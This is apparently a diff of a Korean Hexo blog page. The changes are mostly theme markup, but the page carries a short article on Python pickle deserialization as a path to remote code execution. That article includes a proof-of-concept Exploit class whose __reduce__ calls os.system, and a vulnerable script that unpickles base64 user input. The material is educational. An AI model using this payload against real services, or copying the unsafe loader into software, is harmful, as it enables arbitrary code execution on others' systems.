@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -392,12 +392,36 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <hr>
 <h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때,</p>
 <p>임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__getnewargs_ex__()</span><br><span class="line"><span class="built_in">object</span>.__getnewargs__()</span><br><span class="line"><span class="built_in">object</span>.__getstate__()</span><br><span class="line"><span class="built_in">object</span>.__setstate__(state)</span><br><span class="line"><span class="built_in">object</span>.__reduce__()</span><br><span class="line"><span class="built_in">object</span>.__reduce_ex__(protocol)</span><br></pre></td></tr></table></figure>
+<pre><code class="py">object.__getnewargs_ex__()
+object.__getnewargs__()
+object.__getstate__()
+object.__setstate__(state)
+object.__reduce__()
+object.__reduce_ex__(protocol)</code></pre>
 <p>reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다.</p>
 <p>[pickling.py]</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">shellcode = cPickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(shellcode)</span><br></pre></td></tr></table></figure>
+<pre><code class="py">import os
+import cPickle
+import sys
+import base64
+
+cmd = &#39;id&#39;
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, (cmd,))
+
+shellcode = cPickle.dumps(Exploit())
+print base64.b64encode(shellcode)</code></pre>
 <p>[ex.py]</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cPickle.loads(base64.b64decode(data))</span><br></pre></td></tr></table></figure>
+<pre><code class="py">import os
+import cPickle
+import sys
+import base64
+
+data = raw_input(&quot;&quot;)
+
+print cPickle.loads(base64.b64decode(data))</code></pre>
 <hr>
 <h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://docs.python.org/ko/3/library/pickle.html#data-stream-format">https://docs.python.org/ko/3/library/pickle.html#data-stream-format</a></p>
@@ -412,6 +436,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='footer'>
       
       
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/06/19/bangsiri-wargame-200619/" title="동아리 워게임 홍보(?)" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">동아리 워게임 홍보(?)</span></a></div></section></div>
+      
       
       
     </div>
@@ -424,10 +456,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T18:16:49+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-16T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditJun 16, 2020</p>
   </a>
 </div>
 
@@ -547,42 +579,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -718,6 +714,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1093,6 +1091,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
